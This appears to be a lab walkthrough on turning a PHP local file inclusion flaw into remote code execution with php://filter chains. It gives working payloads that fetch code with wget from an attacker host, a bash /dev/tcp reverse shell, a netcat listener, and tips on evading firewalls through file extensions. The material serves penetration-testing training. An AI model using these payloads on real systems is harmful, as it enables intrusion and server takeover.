_________

# Guide LFI (Directory traversal) / Escalation to RCE through Wrappers

In this exercise, we will approach an LFI combined with PHP wrappers to gain access to the machine. This technique is characterized by being more stealthy and prudent than log poisoning, which benefits us as pentesters.

First, we are going to confirm the existence of an LFI.

![[Pasted image 20260314204044.png]]

We are now going to test if it is vulnerable to wrapper injection.

![[Captura de pantalla 2026-03-13 183831.png]]

![[Captura de pantalla 2026-03-13 185203.png]]

```
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=include.php
```

We extract the info from the `include.php` file in Base64 as bait; the key lies in identifying a file "x" to test a wrapper.

With this, we confirm it is vulnerable to Wrapper injection. We obtained this payload from the following repository:

[PayloadsAllTheThings - File Inclusion Wrappers](https://www.google.com/search?q=https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%2520Inclusion/Wrappers.md)

To continue with the exploitation of this exercise, it is necessary to understand the type of Wrapper we are using and what kind of information it must receive to function successfully.

Due to the security measures implemented to prevent attacks through the `filter` wrapper, as attackers, we must use a **PHP filter chain generator**. This tool generates a chain of instructions with a sequence of PHP filters (**PHP Filter Chain Exploitation**) that will manipulate a file to our advantage without triggering alarms.

We can find a tool to generate this PHP filter sequence in the following repository:

[GitHub - synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

![[Captura de pantalla 2026-03-13 184606.png]]

Here we witness how, using this repository, our script is converted into the sequence that will be injected. Let's see how it is interpreted.

![[Captura de pantalla 2026-03-13 185002.png]]

The system receives it successfully. From this point, we can proceed to pass an HTML script containing a **reverse shell** to our attacker machine via `wget`.

```
bash -i >& /dev/tcp/AttackerIP/443 0>&1
```
    We will open port 80 with `python3` and encode it using the repository:

```
python3 php_filter_chain_generator.py --chain "<?php system('wget 192.168.1.206'); ?>"
```
    Whatever results from this will be loaded onto the page.

Once our script is uploaded, we are going to run it, using the same procedure with the repository:

```
python3 php_filter_chain_generator.py --chain "<?php system('bash index.html.1'); ?>"
```
    To receive the connection back, we will open `nc -nlvp 4443`.

We run it on the page, and if we check our `nc`, we see that it worked correctly.

![[Captura de pantalla 2026-03-14 202529.png]]

### Key points

When using a PHP filter chain generator, it is mandatory to remember that if it generates an excessively long sequence of PHP filters, it may not be processed correctly. The shorter, the better.

When using Filter Chains, keep the URL length limit in mind (usually around 8,192 bytes in Apache). If the payload is too long, the server will return a **414 Request-URI Too Large** error. That is why it is vital to keep the `--chain` command as short as possible.

We focus on the use of the **Filter Wrapper** for this exercise because, under current security standards, it is not often seen as a direct threat, unlike `data` or `input` (which are very insecure and dangerous if active). Those depend on the `allow_url_include` parameter to function (which is generally disabled for security). A small breakdown of their operation:

|**Wrapper**|**Key Requirement**|**Ideal Situation**|**Objective**|
|---|---|---|---|
|**php://filter**|None (almost always active)|Standard LFI where file uploads are blocked.|Read source code (.php) in Base64 or perform Filter Chains.|
|**php://input**|`allow_url_include: On`|When POST requests can be sent.|RCE by sending PHP code in the message body.|
|**data://**|`allow_url_include: On`|LFI where quick and direct RCE in the URL is desired.|RCE by injecting Base64 code directly.|
|**expect://**|`expect` module installed|Very rare/legacy scenario.|Direct execution of system commands (like SSH).|
|**phar://**|Ability to upload any file|When LFI exists and you can upload files but not .php.|Execute PHP code hidden inside a compressed file.|

In these types of exercises where we must upload/download files for successful exploitation, it is key to understand that firewalls are paranoid regarding extensions. Extensions like `.html`, `.txt`, and `.jpg` are recognized as harmless (perfect for pentesters), unlike `.sh` or `.php`, which the firewall will detect immediately. In contrast, in exercises where we interact with existing resources like logs, the extension is irrelevant.

### Conclusion

Mastering **PHP Filter Chains** allows transforming a passive reading vulnerability (LFI) into active execution (RCE), bypassing restrictive `allow_url_include` configurations and operating entirely within the server's memory.